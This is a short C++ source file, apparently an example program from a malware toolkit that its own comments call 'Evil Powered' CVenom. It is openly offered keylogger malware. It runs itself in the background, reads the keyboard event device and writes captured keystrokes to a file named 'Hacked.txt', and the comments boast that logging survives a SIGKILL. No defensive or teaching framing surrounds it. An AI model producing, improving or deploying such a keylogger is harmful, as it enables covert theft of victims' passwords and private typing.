// Compile Normally With: g++ Keylogger.cpp     // Simple, Fast, Powerful,... Evil Powered "C++" Malware Development Kit + Cross-Platform Compilation!!!

#include "../../CVenom.hpp"
#include "../../KeyboardTools.h"
#include "../../RuntimeTools.h"

int main(int argc, char** argv){
	cvinit(argc, argv);  // This is Required For Some Functionalities That Require An Access to The Argument, Like Program name in argv[0]...

	KeyboardTools Keyboard; // The KeyboardTools Class is Used To Program Keyloggers, Spying on the Keyboard...
	RuntimeTools   Malware; // The RuntimeTools Class is Used To Background, Stop, Restart, Pause, Resume, Respawn After,  Current Process..., We Will Use it Here to Background Our Keylogger.

	// The Start Of Our Keylogger, C++ is an Ultra Super-Fast Programming Language Due To It's Clean & Optimized Binary Output Compared To Other Compiled Programming Language..., That's Why I Made CVenom With C++, Fast, Compiled, Cross-Platform ~!~ ...
	Malware.Background();
	Keyboard.GetEventFile(); // Get the event file of the keyboard.
	Keyboard.OutputTo("Hacked.txt");
	Keyboard.Run(); // The Hacked.txt File Will Contain Our Keystrokes Even if the User Killed The keylogger with -9 parameter (SIGKILL), That's Because The Auto-(Sync System call).

}
